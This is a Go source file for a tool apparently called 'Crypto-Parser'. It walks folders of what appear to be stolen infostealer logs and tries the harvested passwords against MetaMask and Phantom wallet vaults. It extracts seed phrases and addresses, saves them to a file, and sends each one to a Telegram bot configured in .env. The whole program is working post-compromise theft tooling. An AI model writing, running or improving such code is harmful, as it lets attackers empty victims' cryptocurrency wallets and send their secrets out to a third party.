package main

import (
	"bufio"
	"fmt"
	"log"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/joho/godotenv"

	"Crypto-Parser/tools"
	wallet "Crypto-Parser/wallets"
	"Crypto-Parser/wallets/metamask"
	"Crypto-Parser/wallets/phantom"
)

var (
	tgbotapi string
	chatid   string
)

func main() {
	path, err := getPath("Enter the path: ")
	if err != nil {
		fmt.Println("Failed.")
	}

	err = godotenv.Load(".env")
	if err != nil {
		log.Print("Failed to load .env", err)
	}

	tgbotapi = os.Getenv("TGBOTAPI")
	chatid = os.Getenv("CHATID")

	extractWalletMnemonics(path)
}

func getPath(promt string) (string, error) {
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Print(promt)
	scanner.Scan()
	path := scanner.Text()
	_, err := os.Stat(path)
	if err != nil {
		return "", fmt.Errorf("there is no such path: %v", err)
	}

	return path, nil
}

func extractWalletMnemonics(logsPath string) {
	tools.SendTelegramNotify(tgbotapi, chatid, "Parsing starts…")
	metamask := metamask.Metamask{}
	phantom := phantom.Phantom{}

	logsDir, err := os.ReadDir(logsPath)
	if err != nil {
		log.Printf("Failed to read log directory: %v\n", err)
	}

	seedFile, err := os.OpenFile("mnemonics.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		log.Printf("Failed to open mnemonics.txt: %v\n", err)
	}

	for _, logFolder := range logsDir {
		logFolderPath := filepath.Join(logsPath, logFolder.Name())
		walletsFolderPath := filepath.Join(logFolderPath, "Wallets")
		passwordFile := filepath.Join(logFolderPath, "Passwords.txt")

		if _, err := os.Stat(walletsFolderPath); err != nil {
			continue
		}

		if _, err := os.Stat(passwordFile); err != nil {
			continue
		}

		passwordsContent, err := os.ReadFile(passwordFile)
		if err != nil {
			log.Println(logFolderPath, err)
			continue
		}

		var passwords []string
		passwordsString := strings.ReplaceAll(string(passwordsContent), "\r", "")
		for _, pass := range regexp.MustCompile(`Password: (.*)`).FindAllStringSubmatch(passwordsString, -1) {
			passwords = append(passwords, pass[1])
		}

		walletsDir, err := os.ReadDir(walletsFolderPath)
		if err != nil {
			fmt.Printf("Failed to read Wallets folder: %v", err)
			continue
		}

		for _, walletFolder := range walletsDir {
			if strings.Contains(walletFolder.Name(), "Metamask") {
				mnemonic, err := metamask.GetMnemonic(filepath.Join(walletsFolderPath, walletFolder.Name()), passwords)
				addr := wallet.AddrFromSeed(mnemonic)
				if err != nil {
					continue
				}
				log.Printf("Found metamask %s. Writing to a file", logFolder.Name())
				textToTelegram := fmt.Sprintf("Found metamask seed: %s\nAdress: %s", mnemonic, addr)
				escapedText := url.QueryEscape(textToTelegram)
				tools.SendTelegramNotify(tgbotapi, chatid, escapedText)
				seedFile.WriteString(fmt.Sprintf("Adress: %s | Seed: %s\n", addr, mnemonic))
			} else if strings.Contains(walletFolder.Name(), "Phantom") {
				mnemonic, err := phantom.GetMnemonic(filepath.Join(walletsFolderPath, walletFolder.Name()), passwords)
				addr := wallet.AddrFromSeed(mnemonic)
				if err != nil {
					continue
				}
				log.Printf("Found phantom %s. Writing to a file", logFolder.Name())
				textToTelegram := fmt.Sprintf("Found phantom seed: %s\nAdress: %s", mnemonic, addr)
				escapedText := url.QueryEscape(textToTelegram)
				tools.SendTelegramNotify(tgbotapi, chatid, escapedText)
				seedFile.WriteString(fmt.Sprintf("Adress: %s | Seed: %s\n", addr, mnemonic))
			}
		}
	}

	dt := time.Now()
	newFileName := dt.Format("2006-01-02 15:04:05")
	newFileName = fmt.Sprintf("./mnemonics %s.txt", newFileName)
	err = os.Rename("./mnemonics.txt", newFileName)
	if err != nil {
		log.Println("Failed to rename file.", err)
	}
}
